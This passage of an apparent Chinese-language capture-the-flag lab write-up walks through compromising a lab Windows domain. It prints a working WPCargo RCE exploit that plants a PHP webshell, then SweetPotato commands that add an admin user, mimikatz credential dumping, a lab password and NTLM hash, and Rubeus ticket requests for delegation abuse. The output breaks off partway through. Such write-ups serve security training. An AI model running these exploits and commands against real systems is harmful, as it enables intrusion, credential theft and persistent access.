+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.34     XIAORANG<span class="se">\C</span>LIENT01         
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.2.3
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>DC
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.2.3
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.2.16        code:404 len:315    title:Not Found
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.2.34
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>CLIENT01
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.2.34
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.3      <span class="o">[</span>+<span class="o">]</span> DC:DC.xiaorang.lab               Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.2.16  <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.18     WORKGROUP<span class="se">\U</span>BUNTU-WEB02    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.2.3   <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ftp 172.22.2.7:21:anonymous 
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>pub
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
+</span></span><span class="line"><span class="cl">已完成 20/20
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上frp转发流量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nohup ./frpc -c ./frpc.ini &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>发现有wordpress，用wpscan扫一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url http://172.22.2.18
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现版本过低</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/" target="_blank" rel="noopener noreferrer">WPCargo &lt; 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities</a></p>
+<p>直接打exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">import sys
+</span></span><span class="line"><span class="cl">import binascii
+</span></span><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This is a magic string that when treated as pixels and compressed using the png</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> <span class="s1">&#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def encode_character_code<span class="o">(</span>c: int<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;{:08b}&#39;</span>.format<span class="o">(</span>c<span class="o">)</span>.replace<span class="o">(</span><span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;x&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">text</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.join<span class="o">([</span>encode_character_code<span class="o">(</span>c<span class="o">)</span> <span class="k">for</span> c in binascii.unhexlify<span class="o">(</span>payload<span class="o">)])[</span>1:<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">destination_url</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.2.18/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">cmd</span> <span class="o">=</span> <span class="s1">&#39;ls&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With 1/11 scale, &#39;1&#39;s will be encoded as single white pixels, &#39;x&#39;s as single black pixels.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">requests.get<span class="o">(</span>
+</span></span><span class="line"><span class="cl">    f<span class="s2">&#34;{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># We have uploaded a webshell - now let&#39;s use it to execute a command.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print<span class="o">(</span>requests.post<span class="o">(</span>
+</span></span><span class="line"><span class="cl">    f<span class="s2">&#34;{destination_url}webshell.php?1=system&#34;</span>, <span class="nv">data</span><span class="o">={</span><span class="s2">&#34;2&#34;</span>: cmd<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">)</span>.content.decode<span class="o">(</span><span class="s1">&#39;ascii&#39;</span>, <span class="s1">&#39;ignore&#39;</span><span class="o">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>蚁剑连接，类型要选cmdlinux</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>在config文件内发现数据库账号密码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>连一下数据库，拿到flag02</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<h2 id="flag03" class="headerLink">
+    <a href="#flag03" class="header-mark"></a>flag03</h2><p>有相关提示</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>发现内网还有个主机开启1433端口，导出过口令，尝试数据库爆破。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>使用MDUT连过去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sa/ElGNkOiC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传SweetPotato提权</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>提权读取flag03</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<h2 id="flag04" class="headerLink">
+    <a href="#flag04" class="header-mark"></a>flag04</h2><p>发现3389端口是开着的</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>创建用户，rdp连过去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:/迅雷下载/sweetpotato.exe -a <span class="s2">&#34;net user test qwer1234! /add&#34;</span>
+</span></span><span class="line"><span class="cl">C:/迅雷下载/sweetpotato.exe -a <span class="s2">&#34;net localgroup administrators test /add&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看一下信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systeminfo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>使用BloodHound分析域关系</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>上传猕猴桃</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe
+</span></span><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>拿到MSSQLSERVER$的NTML</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">f76585e4daca31b783b926e97e03439c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以尝试委派攻击</p>
+<p>上传Rubeus.exe</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.<span class="se">\R</span>ubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f76585e4daca31b783b926e97e03439c /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap &gt; res.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">   ______        _
+</span></span><span class="line"><span class="cl">  <span class="o">(</span>_____ <span class="se">\ </span>     <span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">   _____<span class="o">)</span> <span class="o">)</span>_   _<span class="p">|</span> <span class="p">|</span>__  _____ _   _  ___
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>  __  /<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  _ <span class="se">\|</span> ___ <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/___<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span> <span class="p">|</span>  <span class="se">\ \|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="o">)</span> <span class="o">)</span> ____<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>_<span class="p">|</span>   <span class="p">|</span>_<span class="p">|</span>____/<span class="p">|</span>____/<span class="p">|</span>_____<span class="o">)</span>____/<span class="o">(</span>___/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  v2.2.3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Action: S4U
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using rc4_hmac hash: 7e0afdd74f437da621b7b205a61781e1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">&#39;xiaorang.lab\MSSQLSERVER$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using domain controller: 172.22.2.3:88
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> TGT request successful!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> base64<span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3lkC6JQjHfRCcji5EMsY39Dv/i2//jnIfAkQSjQ1OHlel3r4Wh+lg/u7jAgirmDe18ZnnkVv0it5WM8dNAN6rTYBXP/AxGVuWQWU63EDmtmlXsDmSrSqILnJ+2MZUl2pwX69KQDRJOB5ewy7AW3sPI0JmmJjkVrD98D+UgEqw1XX2xzBiylC2PNPGnqkSm6FA+Itgj2s6KsGITu5uYP9E6dT0Tnv3MzeQMq19/0WoHmy7sNQxgTDLr3hM5za/hE2VxZfijuIA4mZYV+2Uk998xNPgDstAqA22dB5aEnvOYQyIL1cRGE9vJtlc9R0o97tedCTQlu+PyGwsoQsNVx+rbJrSL+CXA9SDPjaULYlJtTZn8PfWUUpWfyU/MjIPQb+l75+lnZmh0rxDRVmQjYJKTVARTmMz+YZ4rV9P+RUNTYBGvZkg65kCT7m4/EGKtNW9zTLAKF3rRX1lgqB9NlVhPCp4gBZxTvzxY+3li6g62NNmwduFFvSpcH4pN+Ra4dIUXF26VlBsxPFU9j0UIOl4UwojwEWQ9IP1gCzH0Xv8MwMsLjeSZhAYoMVObFisd7JSiG31jA4v90BD5JCcYq58xHcUSCf6/k/dvYV6wVMTUSfjrzeQ8Cb1vlxoORgaRNrKT8Jrv8AilqBLwJ/VMMrI5CI9gf4wbfHMObuVe0ekw6Ep2Ef/uBSlpN9kq9UEHNGitAsQzyeIIjxNX5bF+uFRV3j9zawgcEDSA62B+YiCDhe2Kh3cZgM7oDXoy9CPUuW1J2tSv6v6I6j/LMStZtXqnem8aLlSEHUL1p3NWP5CTtJTHlICfxihKcQQbJHtjMePimaSyWUq/gsleaDfty6s+Cv87Gg2ycaZEkep5tbzxz/BLMRzvq4weZdm4Iqee9kWt0uPhBPjDTw2qHLqdxOEhbSKS+wD6JNvN+xJJEe/g7cJL9ndstjKDxD6K6IvW1UMwsdGgn2Zx62Q2yvUG1M/cXpMkAYAVaAjNSkdO8lfgMKrOTU+bz6AM9u5GupaUrzII0tcOlN8gcYv7Pcwsw7F+4GWokEJ/NW5Y0jmcsn+Azi5w3V+VgPBw5FtHCEfoaU+EupxVUnqJSJbq3VrZK/NbV4AZXSY3gYwpqMc4cew5jYI1G1iL8aHiNxcVtdCwQ5wAQoDwJBkr/czCt3PVQaR6V1rSx9ds4hUG1FZHVBy8JVv0oFQQxsx22NB2Tb6aeaSsRQmHMSO94BAl5ChO492PwCQnR7vTzUcjI55zXcnmzEdKgN0I4HsjeTVq7gD4iELF2wJLABQSGJl+MyBms0yyyBXsVr6I6Ex06BUqADgCEX8JskIdlxyJuegtv2JT3gb98cZ0dut9e+ym5Y4w/CslV59lmrq/mX3I7Ki+uKbu1qcK94fSAnRjlLRUjranhKAheVGDVW2AjHbmvW8oN8rEPri3lJ4UGHtJH2WfuHnjcliz2773vyYFwbNhGtqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBA8maMBmJBiqwedjqcg2RbdoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMDcyNDA5NDEwN1qmERgPMjAyMzA3MjQxOTQxMDdapxEYDzIwMjMwNzMxMDk0MTA3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg<span class="o">==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Action: S4U
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Building S4U2self request <span class="k">for</span>: <span class="s1">&#39;MSSQLSERVER$@XIAORANG.LAB&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using domain controller: DC.xiaorang.lab <span class="o">(</span>172.22.2.3<span class="o">)</span>
